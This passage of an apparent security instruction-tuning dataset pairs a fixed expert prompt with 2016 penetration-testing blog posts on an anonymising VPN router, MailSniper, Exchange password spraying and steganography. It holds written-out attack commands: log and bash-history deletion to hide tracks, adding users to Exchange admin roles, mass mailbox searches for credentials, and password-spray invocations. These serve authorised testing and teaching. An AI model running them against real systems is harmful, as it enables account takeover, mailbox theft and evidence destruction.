        "output": "Jordan Drysdale This article like the IADGov link here has three major steps First acquire a Raspberry Pi and a VPS running CentOS 6.8 Second configure the server and Raspberry Pi Last we discuss and learn how to cloak all communications that use the Pi as your new router I will demonstrate with a small peripheral monitor how to get the Pi connected to a Wi-Fi network that has a Terms of Use and Agreement page Through this connection all of my network traffic behind the Pi routes through the VPN tunnel for basically non-attributable communication to the Internet See this article for purchasing servers with gift cards turned in to bitcoins Basics first Link for how to image your Raspberry Pi with whatever operating system you choose ww.raspberrypi.org documentation installation installing-images For brevity's sake I am using Raspbian in this article Quick and easy installation minimum for goSecure VPN server side Pick a platform any of the following have CentOS 6.8 available For full non-attribution see the blog linked in paragraph one The goSecure VPN server configuration is fully supported on CentOS 6.8 so please choose this operating system when selecting your virtual private server Digital Ocean ww.digitalocean.com Linode ww.linode.com Amazon EC2 ws.amazon.com ec2 When purchasing a VPS you will not need to complete the majority of steps listed here adgov.github.io goSecure documentation.html Under Step 1 Build Server Side network configuration you can skip the Internal network configuration since well Amazon isn't likely interested in you configuring VPN access to their trust networks Without further ado the server installation commands root centos6.8 cd root centos6.8 wget adgov.github.io goSecure files install_scripts gosecure_server_install.py this command uses wget to go grab your server install python file this is the server install be sure you pull the server_install.py root centos6.8 sudo python gosecure_server_install.py client_id user1 cloaker.dev client_psk longpasswordforuse please use whatever credentials and domain you want the domain is irrelevant and your system will reboot after this command completes That is all it takes However to change edit or modify users you will need to modify the following two files root centos6.8 sudo yum install nano -y adding nano text editor root centos6.8 sudo nano etc ipsec.conf add users in here root centos6.8 sudo nano etc ipsec.secrets add secrets in here Quick and easy installation minimum for goSecure VPN client side The following steps are all taken from the IADGov site and there are lots of beautiful screenshots out there 1 Configure the Raspberry Pi from the terminal with the sudo raspi-config command Change User Password Option 2 Internalisation Options Option 5 Change Timezone Change Keyboard Layout UK Keyboard by Default see screenshots for this section there are lots of options Change Wi-Fi Country 2 To apply changes click tab twice and reboot 3 Configure Networking and make it match the following example network interfaces file pi sudo nano etc network interfaces interfaces 5 file used by ifup 8 and ifdown 8 Please note that this file is written to be used with dhcpcd For static IP consult etc dhcpcd.conf and 'man dhcpcd.conf Include files from etc network interfaces.d source-directory etc network interfaces.d auto lo iface lo inet loopback The eth0 interface will become your cloaking router's interface IP You can set it to whatever you want but this must be configured prior to running the client_install.pyauto eth0allow-hotplug eth0iface eth0 inet staticaddress 192.168.50.1netmask 255.255.255.0 auto wlan0 allow-hotplug wlan0 iface wlan0 inet manual wpa-conf etc wpa_supplicant wpa_supplicant.conf Restart networking using sudo service networking restart Update OS and Raspberry Pi sudo apt-get update -y sudo apt-get upgrade -y sudo apt-get dist-upgrade -y sudo apt-get install rpi-update sudo rpi-update sudo reboot After reboot on login prompt login 5 wget and run the goSecure Client Install Script pi cd pi wget adgov.github.io goSecure files install_scripts gosecure_client_install.py pi sudo python gosecure_client_install.py 6 Clean up remove all of your configuration tracks pi sudo rm home pi gosecure_client_install.py pi sudo rm -rf usr share doc opt vc src hello_pi pi sudo find usr share locale -maxdepth 0 -type d grep -v en xargs sudo rm -rf pi sudo find usr share man -maxdepth 0 -type d grep -Pv 'man d xargs sudo rm -rf pi sudo find -type f -name -old xargs sudo rm -rf pi sudo rm -rf var backups var lib apt lists .bash_history pi sudo find var log -type f xargs sudo rm -rf pi sudo cp dev null etc resolv.conf pi sudo reboot Quick and easy client use case screenshots and such further Connect network cable from laptop PC or switch to the Raspberry Pi Plug in the USB cable to the goSecure Client to the device to provide power Wait 60 seconds Open a web browser and navigate to etup.gosecure Follow the instructions on the web page that appears The default login username is admin and the password is gosecure You will be prompted to change them once you login The next page will prompt you for the local wireless network I carry a small monitor if I need to accept a terms of service page for Wi-Fi access The next page will prompt you for the destination VPN server your previously acquired VPS IP address and the credentials used in the server_install.py command Like those from earlier user1 cloaker.dev longpasswordforuse Everything should turn green and you should confirm you are cloaked behind your VPS IP Troubleshooting Page Unavailable If you cannot access the site can you ping 192.168.50.1 Did you receive an IP address on the 192.168.50.x network Does a route -n command at a terminal on the Pi produce a valid default gateway or all zeroes route 0.0.0.0 192.168.1.1 if not run a sudo route add default gw command in the same terminal Finally a normal use case Plug in the Ethernet cable from the goSecure Client to your laptop Plug in the USB cable to the goSecure Client to the device Wait 60 seconds I use the portable monitor here to accept the Wi-Fi network's terms of service on the Pi My laptop is wired to the Pi and it becomes my router gateway cloaker 4 Login to the goSecure client gui at etup.gosecure from laptop 5 Configure your VPS IP in the VPN field and your pre-configured username and password 6 Magical time great success You are cloaked and should be buried behind your VPS IP address when browsing the internet Take another step create a new local port hiding an SSH tunnel outbound and add another layer of obscurity with this hyperion tau-ceti ssh -D 3333 -f -C -q -N -p 8415 enoch 12.34.56.78 consider this server another layer of obfuscation hyperion tau-ceti google-chrome --proxy-server socks localhost 3333 socks proxy for the win Thanks for reading Have fun Be safe"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Introducing MailSniper: A Tool For Searching Every User's Email for Sensitive Data</title>\n<taxonomies>Author, Beau Bullock, External/Internal, Red Team, Beau Bullock, hunting, Pentesting, pillaging, red teaming, sensitive info, yolo</taxonomies>\n<creation_date>Sun, 25 Sep 2016 15:45:49 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock TL DR MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms passwords insider intel network architecture information etc It can be used as a non-administrative user to search their own email or by an Exchange administrator to search the mailboxes of every user in a domain MailSniper is available for download here ithub.com dafthack MailSniper Overview Oftentimes on penetration tests we find ourselves having elevated access Domain Admin within an organization Some firms stop there thinking that DA is the end goal But it's not Getting DA means nothing to most members of the C-suite level if you can't provide a picture of what that means in terms of risk One of the best ways to demonstrate risk to an organization is to show the ability to gain access to sensitive data Sensitive data to an organization varies greatly from company to company Some common examples of sensitive data are customer information credit card numbers Social Security numbers employee information intellectual property industrial control systems SCADA health care data etc According to the 2016 Mandiant M-Trends Report PDF in 2015 the median number of days organizations were compromised before they detected the breach was 146 Having that much time inside of any network allows attackers to slowly and stealthily gain operational awareness determine what the organization deems sensitive data locate sensitive data on the network compromise sensitive data and ultimately exfiltrate it How do we as pentesters go about providing that same illustration in terms of risk to an organization when we typically only have less than 5 days to complete an assessment In this blog post I will detail a new tool I have developed to assist in the location of sensitive data on a network by searching through every employee's email for specific terms The tool is called MailSniper Why Should We Search Email First off there are already some great tools available for locating sensitive data on a network One of my favorite tools that I use on pretty much every engagement is called PowerView PS1 by Will Schroeder harmj0y PowerView has the ability to locate available shares on a network Invoke-ShareFinder and search through files Invoke-FileFinder on them for specific terms in the file names Searching network shares for files containing sensitive data has proved fruitful for myself many times But this was not always the case Occasionally networks I have tested were so large that scanning every network share would not complete during the testing window Other times maybe the attack surface was very small in terms of alive hosts or sensitive data is simply not being stored on network shares at all In these cases previously I would resort to a more manual approach to locating sensitive data which would not always result in me obtaining it This led me down the path to thinking about what else can we do to locate sensitive data quickly in a network Through discussions with Derek Banks 0xderuke and Ethan Robish ethanrobish at DerbyCon last year we came upon the idea of searching email within an organization Email is very often the primary messaging system inside most organizations and is the go-to medium for a simple chit chat about daily business password resets or even corporate strategy Having the power to search through email is huge when hunting for sensitive data For example a simple search for the term password in the body and subject of every email might return instructions on how to access certain systems along with what credentials to use At an energy company a search for scada or industrial control system might return a conversation detailing the location of sensitive ICS devices At a financial institution a search for credit card might reveal where employees have been sending credit card numbers in cleartext over email At a healthcare organization searching for SSN or Social Security number could return potential health care data Here is a real-world example where searching for the term database in emails revealed a conversation where a SysAdmin was telling his team where the location of their internal KeePass database was migrated to along with the key file I copied the DB and key file to my testing system and opened it with KeePass Of course a second factor wasn't required All I needed was the key file that was in the same directory as the DB facepalm It was a gold mine of pretty much every credential you would ever want at an organization All of the 'sa passwords to databases all of the network device passwords passwords to login to their security products Windows administrative passwords VPN Group ID pass etc Most of the environments we see are typically running Microsoft Exchange for email services Microsoft Exchange already has a few tools for searching email built-in to the server itself From the Exchange Management Shell on the server the Search-Mailbox cmdlet has some search functionality but not at the level I wanted So I set out on building a new tool to accomplish my goal of being able to search all the mailboxes on a domain for specific terms MailSniper.ps1 Available here ithub.com dafthack MailSniper To accomplish my goal I decided to start building a tool called MailSniper written in PowerShell for a few reasons PowerShell scripts are very portable Some basic scripts for connecting to Exchange Web Services already exist Microsoft Exchange Server starting with version 2007 has implemented a web API called Exchange Web Services EWS EWS allows for remote web calls to the Exchange server to gather various data including calendars contacts and messages The ability to connect to Exchange remotely from any system on the network provides highly flexible search capabilities I wanted this to be a tool that could operate completely remote from any host on the network to the Exchange server meaning an interactive session RDP VNC etc was not required In doing research into Exchange Web Services I discovered a few things that I found interesting that would ultimately lead to a second function being developed My initial goal was to create a tool to search through every mailbox in a domain for specific terms Another highly useful function of Exchange Web Services I hadn't considered is to simply search the current user's email alone Because of this possibility I created a separate function inside of MailSniper The two main functions in MailSniper are Invoke-GlobalMailSearch and Invoke-SelfSearch Invoke-SelfSearch Invoke-SelfSearch is a function that will simply search for terms in the current user's mailbox The ability to search your own email in a pentesting situation may seem at first like something that wouldn't be all that useful But when you start to consider how often we as pentesters gain access to other user's credentials during engagements and combine that then with the ability to search their email from a PowerShell script it becomes much more powerful It becomes a brand new privilege escalation vector For example let's say that through password spraying we were able to gain access to 10 user credentials but none of them have any administrative access By searching through each one of their mailboxes for the terms password creds or credentials we might very well find a number of conversations that include information that would allow us to access other accounts or systems To search the current user's mailbox first open a PowerShell terminal with the '-exec bypass option to bypass execution policy Then import the MailSniper.ps1 module into a PowerShell terminal and run the following Invoke-SelfSearch command with the email address of your user Invoke-SelfSearch -Mailbox current-user domain.com This command will connect to the Exchange server auto-discovered from the email address entered using Exchange Web Services where by default 100 of the latest emails from the Mailbox will be searched through for the terms pass creds credentials By default the only option necessary for Invoke-SelfSearch is the -Mailbox option A full list of options that can be used are ExchHostname The hostname of the Exchange server to connect to if Autodiscover is failing Mailbox Email address of the current user the PowerShell process is running as i.e the only mailbox the account can search Terms Certain terms to search through each email subject and body for By default the script looks for password creds credentials ExchangeVersion In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified By default this script tries Exchange2010 Additional options to try are Exchange2007_SP1 Exchange2010 Exchange2010_SP1 Exchange2010_SP2 Exchange2013 or Exchange2013_SP1 OutputCsv Outputs the results of the search to a CSV file MailsPerUser The total number of latest emails to search through in the mailbox The default is set to the latest 100 emails in the inbox Invoke-GlobalMailSearch Invoke-GlobalMailSearch is a function that will search through all mailboxes on an Exchange server The process to search through every mailbox is a bit more complicated than just searching the mailbox of the current user For starters just getting a Domain Admin account doesn't necessarily mean you now have access to everyone's mailbox By default the Domain Admins group does not have full access rights to mailboxes on Exchange The account group that has complete and utter control of everything related to Exchange is the Exchange Organization Administrators group FYI This group name varies between Exchange versions In Exchange 2013 the group is called Organization Management In order to make this script work you will need an account from that group In the few tests I have run it appears that Domain Admins has the ability to grant this access to any account So if typical user hunting with doesn't yield you an Exchange admin account you can always resort to adding your own user to the group with a DA From a workstation on the domain the following command can be run as a domain admin to add a user to the Exchange Organization Administrators group C net groups Exchange Organization Administrators DOMAIN ADD In researching deeper into accessing other users mailboxes I came across what is called the ApplicationImpersonation role The ApplicationImpersonation role is a Microsoft Exchange server role that when granted to a user allows them to impersonate other users when accessing mailboxes This role can be granted at the Exchange Management Shell with the following command New-ManagementRoleAssignment -Name impersonationAssignmentName -Role ApplicationImpersonation -User username-of-impersonation-user Having this role assigned to a user I controlled allowed for accessing other users mailboxes Exchange Management Shell was required to make this change This is installed on the Exchange server itself In order to perform this action remotely Invoke-GlobalMailSearch sets up a PowerShell remoting session to the Exchange server as the Exchange admin and then imports the Microsoft.Exchange configuration which includes all of the Exchange Management Shell commands After the PS-Remoting session is established Invoke-GlobalMailSearch grants a specific user passed in via the -ImpersonationAccount option the ApplicationImpersonation role After this role has been granted the Invoke-GlobalMailSearch function creates a list of all mailboxes in the Exchange database using the Exchange Management Shell command 'Get-Mailbox Select Name -ExpandProperty EmailAddresses It is also possible to pass in a custom list of email addresses with the -MailList flag Invoke-GlobalMailSearch then connects to Exchange Web Services using the account with the impersonation role to gather a number of emails from each mailbox and ultimately searches through them for specific terms By default the script searches for password creds credentials To search all mailboxes on an Exchange server import the MailSniper.ps1 module into a PowerShell terminal then run the following command changing out the options to match the target environment Invoke-GlobalMailSearch -ImpersonationAccount current-username ExchHostname Exch01 -OutputCsv global-email-search.csv This command will connect to the Exchange server located at 'Exch01 and prompt for administrative credentials Once administrative credentials have been entered a PS remoting session is set up to the Exchange server where the ApplicationImpersonation role is then granted to the current-username user A list of all email addresses in the domain is then gathered followed by a connection to Exchange Web Services as current-username where by default 100 of the latest emails from each mailbox will be searched through for the terms pass creds credentials and output to a CSV file called global-email-search.csv The CSV that is output should look something like the screenshot below Another example of command for Invoke-GlobalMailSearch would be Invoke-GlobalMailSearch -ImpersonationAccount current-username AutoDiscoverEmail user domain.com -MailsPerUser 1000 -Terms passwords super secret industrial control systems scada launch codes -ExchangeVersion Exchange2010 -OutputCsv example2search.csv AdminUserName domain adminusername -AdminPassword SuperSecurePassword123 This command will connect to the Exchange server auto-discovered from the email address entered and automatically login with the administrative credentials passed on the command line A PS-Remoting session is then setup to the Exchange server where the ApplicationImpersonation role is then granted to the current-username user A list of all email addresses in the domain is then gathered followed by a connection to Exchange Web Services using the Exchange Version 'Exchange2010 as current-username where 1 000 of the latest emails from each mailbox will be searched through for the terms passwords super secret industrial control systems scada launch codes and output to a CSV called example2search.csv A full list of options that can be used with Invoke-GlobalMailSearch are ImpersonationAccount Username of the current user account the PowerShell process is running as This user will be granted the ApplicationImpersonation role on Exchange ExchHostname The hostname of the Exchange server to connect to if Autodiscover is failing AutoDiscoverEmail A valid email address that will be used to autodiscover where the Exchange server is located AdminUserName The username of an Exchange administrator including the domain i.e domain adminusername AdminPassword The password to the Exchange administrator account specified with AdminUserName Terms Certain terms to search through each email subject and body for By default the script looks for password creds credentials ExchangeVersion In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified By default this script tries Exchange2010 Additional options to try are Exchange2007_SP1 Exchange2010 Exchange2010_SP1 Exchange2010_SP2 Exchange2013 or Exchange2013_SP1 OutputCsv Outputs the results of the search to a CSV file MailsPerUser The total number of latest emails to search through in the mailbox The default is set to the latest 100 emails in the inbox EmailList A text file listing email addresses to search one per line Demo Video outu.be ePHbtDF6EnE Conclusion Having the ability to now search through every mailbox on a domain allows us as penetration testers to discover sensitive data on a network faster It might also prove to be useful for escalating privileges From a blue team perspective it could even be used regularly to check if employees are sending sensitive information in emails that are against company policy As of this blog post MailSniper is very much in beta form and is under development Some future objectives for the tool are already being planned out as well Download MailSniper here ithub.com dafthack MailSniper"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Ten years later Memories from Pentesting Past</title>\n<taxonomies>Author, InfoSec 101, John Strand, how John got bitter, Life Lessons, Pentesting, pentesting lessons, when in doubt ask</taxonomies>\n<creation_date>Wed, 28 Sep 2016 15:30:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand So I have passed the timeframe where I have been actively penetration testing for over a decade I have a large number of pretty strongly held beliefs on penetration testing and I thought it would be fun to walk through how I came to those conclusions and got angry bitter and highly protective of my ideas and private property Yes This seems like a perfectly logical trajectory for me at this point One of the things I am a bit harsh on is how many testers these days are focused on scanning and simply looking for red vulnerabilities A long time ago we were testing an organization and they had a fairly clean network They were doing regular scans and worked very hard to keep all the reds and even yellows at bay And yes they were smug about it Very smug You see they had a number of tests over the years where teams of recent college grads would show up and simply run Nessus and leave They had no idea how anything worked could not get DHCP to work and simply ran through checklists and spent all their time copying and pasting results from tools into their word template This of course never happens today This was back in the time when security testing companies were in it for the biggest buck possible Not like today Sarcasm I know this language -Jack Anyway the target organization was pretty confident And why wouldn't they be 99.9 of testers knew next to nothing about pretty much anything Not like today where all testers are sysadmins and developers and hold multiple degrees and are fully vetted before sending a single packet in anger Like I said a different time So we started breaking down services and actually connecting to them to see what we could find Service by service Banner by banner We can across one Linux system which was running an older 2ish version of Linux All it had was a lonely banner stating the SSH version We resolved the name of the system back to roomwizard.company.com It was a room reservation system running full Linux and just waiting for a password We did not know the password So we brute-forced the root password for a few days to no avail This is when I learned that you can easily overload SSH with too many password attempts We scaled it back to one guess at a time and let it run again To no avail So I decided to call the Room Wizard company and ask for the root password That's so wizard Phantom Menace reference achievement unlocked The very nice tech support lady spent five or six minutes looking it up Then she put me on hold for like an hour When she came back she said Please do not hack the Room Wizard I responded No I just need to update the SSH version It is out of date and it is messing with our DIACAP score She said No that is the password All lower case pleasedonothacktheroomwizard I tried it and it worked I was in Like a G .eek You see the lesson is that sometimes the greatest exploits and success come from weird places This is the genesis This is where it all transitioned for me on network assessments I cannot remember all the times I exploited MS03_026 It was a lot But this stuck This is where I started looking at network testing as something more than simply looking at scans This is what makes our job special It makes it fun and unique It keeps us employed -John"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Many Thanks to BHIS</title>\n<taxonomies>InfoSec 101, our interns love us, we love our interns</taxonomies>\n<creation_date>Fri, 30 Sep 2016 15:36:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kali Regenold My time here at Black Hills Information Security has been short so far but I believe it's been the most important four months of my computer science and security career I started at the end of last semester so sometime in April At the time I thought I was way in over my head and I guess I kind of was I didn't know the first thing about security I was super stressed coming in and felt like I knew nothing I mean if I made any wrong step the entire company could go down I was just a freshman But that stress really didn't last long Everyone here made me feel welcome And with an office of around ten people I can confidently say everyone helped me out I knew Logan previously throughout my year with the robotics lab and UAS so he sat down with me and showed me the ropes Even better he answered most of the questions that I had He said he shared my initial experience not knowing things and not knowing how to find out But he assured me that it's okay to not know and it's okay to ask questions That was when I started to relax I knew this was going to be great Okay so relaxing didn't last too long I was thrown into a project so big it could swallow me whole and I had to get on top of my game Lawrence played a key role here in not only presenting me with challenges that I saw initially impossible but showed me ways to solve them in a clever and effective manner One of the biggest takeaways from working on the project was how to write code that was clean and fast enough to work with everyone else's code It's hard to learn how to do that kind of programming in classes and extremely hard to actually see it in action In one piece my program went from taking 36 hours to run through to about 5 hours I nearly fainted Lawrence also taught me how to make computers work for me more than I worked for it If I had to learn only one thing here it's that sed and awk are crazy powerful The other interns here were also extremely welcoming When everyone else would go home to their lives the interns would stay behind And after the last person left we'd gather in the intern cave and share stories as the computer tower made the room a sauna I heard about insane hacks people made what conventions we go to who we've worked with and of course we gossiped But this is where I learned about how this fascinating company came to be and some of it's history in the security world Everyone in the room loved the company and was very happy being here I now feel the same way I'm not as in over my head as I used to be and I probably never was I just didn't know how to deal with the problems being presented to me I learned how to do good work for this company and I learned how to be a better computer scientist I'll graduate someday and know that I would never be where I am without Black Hills Information Security In light of this I'd like to thank everyone in the Rapid City office and anywhere else in the company for their support and knowledge This place wouldn't be the same without you"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Attacking Exchange with MailSniper</title>\n<taxonomies>Author, Beau Bullock, External/Internal, Red Team, Beau Bullock, FindPeople, Get-GlobalAddressList, Invoke-PasswordSprayOWA, InvokePasswordSprayEWS, MailSniper, OWA, updates</taxonomies>\n<creation_date>Mon, 03 Oct 2016 15:41:54 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock I've added in a few modules to MailSniper that will assist in remote attacks against organizations that are hosting an externally facing Exchange server OWA or EWS Specifically the modules are Get-GlobalAddressList Invoke-PasswordSprayOWA and Invoke-PasswordSprayEWS Get-GlobalAddressList Very often on external penetration tests we perform a reconnaissance phase that might yield us some email addresses or usernames of an organization If we can successfully find valid credentials for any one of them and the organization has an Outlook Web Access or Exchange Web Services portal it is possible to download the entire Global Address List from the Exchange server So from one valid credential we can now have access to all email addresses for every employee of an organization In trying to improve on the method Carrie Roberts wrote about in her blog post regarding gathering the Global Address List from OWA manually I've automated this task into MailSniper Brian Fehrman found something very interesting in OWA There is a function called FindPeople that will allow you to pull back the entire GAL with a single request Unfortunately this function is only implemented in Exchange version 2013 In testing Get-GlobalAddressList that utilizes the FindPeople function was able to pull 4282 email addresses from a remote OWA portal in 10 seconds The OWA FindPeople method requires you are using PowerShell version 3 or higher For cases where the Exchange version is less than 2013 Get-GlobalAddressList fails back to enumerating the GAL from Exchange Web Services This method can take a bit longer due to the fact that EWS will only let you search 100 results at a time To get around this restriction I basically search AA through ZZ then sort uniq the results To use it import the module into a PowerShell version 3 session then run something like this Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain username -Password Fall2016 -OutFile global-address-list.txt If Exchange version is 2013 it should look something like this After obtaining the full email list you can then feed that back into password spraying attacks where you will likely gain more valid credentials Speaking of password spraying Invoke-PasswordSprayOWA Invoke-PasswordSprayEWS I wrote in two modules for password spraying Outlook Web Access and Exchange Web Services to MailSniper Password spraying is an attack where instead of trying to brute force many password attempts for a single user account we try one password across many user accounts This helps avoid account lockout and will still result in us obtaining valid credentials as users still pick passwords like Fall2016 Both of the functions are multi-threaded Just pass the -Threads option and specify a number of threads 15 seems to be a pretty good starting point Both functions have a similar structure but one thing to note is that Invoke-PasswordSprayOWA requires PowerShell version 3 or higher To use Invoke-PasswordSprayOWA import the module into a PowerShell version 3 session then run something like this Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt To use Invoke-PasswordSprayEWS import the module into a PowerShell session then run something like this Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList userlist.txt -Password Fall2016 -Threads 15 -OutFile ews-sprayed-creds.txt You should start to see credentials populate in the terminal as MailSniper finds valid creds In testing I've noticed the EWS password spraying method is significantly faster Both Invoke-PasswordSprayOWA and using Burp Intruder with 15 threads took about 1 hour and 45 minutes to complete spraying 10 000 users Spraying that same list of users against EWS took only 9 minutes and 28 seconds For more information about MailSniper check out this blog post"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Creating the Next Generation of Interns</title>\n<taxonomies>InfoSec 101, cyberpatriot, free swag, interns, picoCTF, teach to learn, training</taxonomies>\n<creation_date>Wed, 05 Oct 2016 14:28:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Chevy Swanson I got my start in InfoSec through a few competitions during my time in high school My team and I were fortunate to have a supportive school and many mentors who helped teach us what we needed to know However when I would look around I would see teams posting online hoping to get a little bit of help I think it is a shame that these students are interested in InfoSec but lack the quality mentors that I was grateful to have I do what I can to give back to the main competition that got me into InfoSec CyberPatriot by mentoring teams and offering help online Cyberpatriot A High School infosec competition that has had great success at introducing students to infosec CyberPatriot is the big player in the small field of high school security competitions and boasts membership of hundreds of teams across all 50 states The competition gives each team a set of virtual machines with either Windows or Linux that are in a state of disrepair from a security standpoint often compromised with malware already present Success in this competition means removing the malware and implementing security policies that don't interfere with the workstation or server from doing its job Honestly this isn't a very hard competition but many students are completely new to the subject Also many teams simply lack mentors and talented people to help teach them When I mentor teams and help students with competition training even though the material isn't very complicated it has proven to be one of the best ways for me to continue learning This must be why those SANS people are so smart especially that John Strand guy This is actually a documented phenomenon called The Protege Effect By teaching you are able to understand the topics better By surrounding yourself with people eager to learn you are likely to be asked quality questions that would not have been raised otherwise People who are new to InfoSec and who are actually interested in the subject are going to be very curious this curiosity leads to a better understanding and education to both the teacher and the students In addition simply knowing you will be teaching changes your mindset and makes a big impact on your ability to learn PicoCTF A High School level CTF that attracts hundreds of teams each time it's held High School level competitions like CyberPatriot and PicoCTF are doing wonders by introducing hundreds of students to InfoSec each year With so many companies looking for interns and talented people it is important that we support these efforts and avoid scaring people away from the field by making their first encounter a competition they weren't prepared for Simply put very few interested students will continue to pursue InfoSec if they are introduced to the field by being crushed in a competition for reasons they feel like they weren't able to control such as having less resources than some more fortunate teams Furthermore if too many students become disengaged then we may see an alarmingly low pool of interns in the future One thing we need to remember with a small pool of interns there will be no more interns to do freeze-frame jumps behind text that says Interns I will be working to get the BHIS interns to make our own version of this photo With the benefits to both ourselves the students and the future of interns in mind I strongly urge anyone who is interested to help out a CyberPatriot team sadly CyberPatriot seems to be the organized InfoSec competition that makes mentoring and helping easy to do CyberPatriot has a very organized way of assigning mentors to teams All you have to do is go to their website and apply to be a mentor They do a background check then you can see a list of teams and simply click a button to indicate that you would be interested in helping a specific team So many teams could use the help And if you volunteer to help a local team you get a free shirt which is always a good deal"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Steganography: The Art & Science of Hiding Things in Other Things - Part 1</title>\n<taxonomies>How-To, binary, C2, covert communications, steganography</taxonomies>\n<creation_date>Fri, 07 Oct 2016 16:52:45 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson Part 1 Image Formats What if I told you this adorable puppy was hiding a secret message In this post we'll find out how this dog was convinced to hide a message for us and how to learn its secrets Along the way we'll learn a lot about how images work and just enough math to make your high school teacher say I told you so Let's start with the basics You might already know some of this but stick with me here Computers are really just things that take bits 01100010 01101100 01100001 01100011 01101011 01101000 01101001 01101100 01101100 01110011 01101001 01101110 01100110 01101111 01110011 01100101 01100011 00101110 01100011 01101111 01101101 00101111 01101100 01101100 And turn them into other bits 01101010 01101111 01101000 01101110 00100000 01110010 01101111 01100011 01101011 01110011 This makes up the core of information processing in the world Underneath cell phones computers the Internet everything digital it's all just patterns of ones and zeros Unfortunately though not very many people can read binary and so those bits have to be turned into something that actual humans can understand since for now at least computers exist to serve humans This creates problems Who says what patterns of bits turn into what words and pictures on a screen Nobody that's who Er also kind of everybody Or maybe just some certain special people Turns out it's a huge mess Various people and groups at various times for various reasons have stuck a flag in the ground and said THIS is how you turn a bunch of bits into an image of a cat Whenever you see a hilarious GIF for example you can thank the fine folks who worked at CompuServe in 1987 and decided how GIFs should work but not how we're supposed to pronounce GIF for some reason Wanna know more than you ever wanted to about GIFs Here's their full specification ww.w3.org Graphics GIF spec-gif87.txt It's alright I'll wait Now that you've memorized the entire GIF format you did right there will be a quiz later we can move on What does any of this have to do with hiding things Well we need a place to hide Think of it as scoping out the best hide-and-seek locations in the new office For instance in the bitmap format what we'll be dealing with for the rest of this article bitmap files end in .bmp each pixel contains an R G and B red green and blue value each of which are one byte eight bits Since you can combine red green and blue into any color if you mix them right this means that just those three values can allow a pixel to be any color When you get a big list of pixels and decide how to shape the list i.e are those 500 pixels a 100 x 5 pixel image or a 50 x 10 pixel image or then you can display that long list of values as an image Why will we use bitmaps here Because they're incredibly simple Yep simple That means that this staggeringly lame 2x2 pixel image that I made just now Is actually this 01000010 01001101 01000110 00000000 00000000 00000000 BMF 00000000 00000000 00000000 00000000 00110110 00000000 ....6 00000000 00000000 00101000 00000000 00000000 00000000 00000010 00000000 00000000 00000000 00000010 00000000 00000000 00000000 00000001 00000000 00011000 00000000 00000000 00000000 00000000 00000000 00010000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 11111111 00100110 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 11111111 00000000 01111111 01011011 00000000 00000000 But why are we learning about this We haven't even hidden anything yet Fear not we shall soon First we need to ruin some perfectly good pictures in the process of finding ourselves a place to hide One of the implications of using numbers for things is that all bits are equal but some bits are more equal 